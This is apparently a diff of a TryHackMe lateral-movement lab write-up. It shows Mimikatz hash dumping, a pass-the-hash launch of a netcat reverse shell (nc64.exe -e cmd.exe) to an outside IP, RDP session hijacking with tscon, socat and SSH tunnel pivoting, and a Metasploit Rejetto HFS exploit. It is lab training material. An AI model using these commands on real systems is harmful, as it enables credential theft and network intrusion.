@@ -1097,7 +1097,7 @@ C:\tools\mimikatz.exe
 
 Now the following mimikatz commands:
 
-```
+```cmd
 # privilege::debug
 # token::elevate
 # sekurlsa::msv
@@ -1105,7 +1105,7 @@ Now the following mimikatz commands:
 
 This will give us debug privileges and dump NTLM hashes. Now we will need to navigate a hash for any Domain user. So any user whose Domain is `ZA`. After that copy the NTLM hash and use it in the following way:
 
-```
+```cmd
 # token::revert
 # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:bfbd9f1d0398493e7f6288f3ff14e7e9 /run:"C:\tools\nc64.exe -e cmd.exe 10.50.65.56 9233"
 ```
@@ -1121,15 +1121,131 @@ C:\Windows\system32>
 
 Now that we received the shell, we can use `winrs.exe` to connect to THMIIS as `t1_toby.beck`:
 
-```
+```cmd
 winrs.exe -r:THMIIS.za.tryhackme.com cmd
 ```
 
 Now let's retrieve the flag:
 
-```
+```cmd
 dir C:\Users\t1_toby.beck\Desktop
 C:\Users\t1_toby.beck\Desktop\Flag.exe
 ```
 
 There's our Flag!
+
+The task involves hijacking an RDP session on the THMJMP2 machine. First, I obtained credentials from the provided URL and used `xfreerdp` to connect to THMJMP2. Once inside, I elevated privileges to SYSTEM using `PsExec64.exe -s cmd.exe`.
+
+Next, I enumerated active user sessions with `query user`, identifying a disconnected session belonging to `t1_toby.beck`. Using the session ID from the output, I executed `tscon <session_id> /dest:<my_session_name>` to hijack the session. Upon successful execution, I gained control of `t1_toby.beck`'s session and retrieved the flag.
+
+First, let's get credentials:
+
+```shell
+firefox http://distributor.za.tryhackme.com/creds_t2
+```
+
+> Your credentials have been generated: Username: `t2_george.kay` Password: `Jght9206` 
+
+Now let's use `xfreerdp` to connect to this user:
+
+```shell
+xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384 /cert:ignore +clipboard
+```
+
+This didn't work well for me, so I opted to complete this task on a Windows VM using `mstsc.exe`. 
+
+- Open `mstsc.exe`
+- Enter `thmjmp2.za.tryhackme.com`
+- Log in with the credentials. (I used `ZA\t2_george.kay` as username to get it to work)
+
+Once inside THMJMP2, open Command Prompt as Administrator: press `Win + R`, type `cmd`, and hit `Ctrl + Shift + Enter` (Or maybe just look for `cmd` in start menu, right click and "Run as administrator").
+
+If not, then run the following:
+
+```cmd
+cd C:\tools
+PsExec64.exe -s cmd.exe
+```
+
+Now identify RDP sessions:
+
+```cmd
+query user
+```
+
+This should list active RDP sessions. One of which should be: `t1_toby.beck`. All we have to do now is use command to hijack it:
+
+```cmd
+tscon 3 /dest:rdp-tcp#6
+```
+
+In this case the session to be hijacked has an ID of `3` and we are writing destionation of our own session in `/dest:`. And that's it we got the flag.
+
+In restricted network environments, attackers often face blocked ports and segmentation that prevent direct access to critical services like SMB, RDP, WinRM, and RPC. To bypass these restrictions, attackers can use port forwarding techniques, turning a compromised machine into a pivot point to reach otherwise inaccessible hosts.
+
+First we'll have to retrieve credentials from `distributor.za.tryhackme.com/creds`:
+
+> Your credentials have been generated: Username: `damien.horton` Password: `pABqHYKsG8L7`
+
+Let's log in now: 
+
+```shell
+ssh za\\damien.horton@10.200.71.249
+```
+
+Now that we're in, let's visit socat:
+
+```cmd
+cd C:\tools\socat
+```
+
+And start port forwarding with it: 
+
+```
+socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+```
+
+Now on the host machine connect to it via RDP:
+
+```shell
+xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
+```
+
+Once in, retrieve the flag from `t1_thomas.moore`'s Desktop.
+
+The THMDC server runs a vulnerable web server (Rejetto HFS) on port 80. Firewall rules prevent direct access to THMDC and outbound connections from THMDC to the attacker’s machine.The exploit requires multiple port forwards.
+
+THMJMP2 can reach THMDC’s port 80, but the attacker cannot. We set up remote port forwarding to make port 80 available to the attacker:
+
+```cmd
+ssh tunneluser@1.1.1.1 -R 8080:THMDC.za.tryhackme.com:80 -N
+```
+
+Let's verify access on attacking linux machine:
+
+```
+curl http://127.0.0.1:8080
+```
+
+If this request succeeds we have proxied THMDC’s web server through THMJMP2
+
+The exploit requires a web server to serve the payload. Since THMDC blocks outbound connections, we host the web server on THMJMP2 instead. On THMJMP2, start a simple web server:
+
+```cmd
+python -m http.server 8000
+```
+
+Modify the exploit's options in `metasploit`:
+
+```shell
+msfconsole -qx "use exploit/windows/http/rejetto_hfs_exec; set RPORT 8080; set SRVPORT 8000; set LHOST 127.0.0.1; set LPORT 9001"
+```
+
+Now set up a listener on the linux machine:
+
+```
+nc -lvnp 9001
+```
+
+And run the exploit. See flag at `C:\hfs`!
+
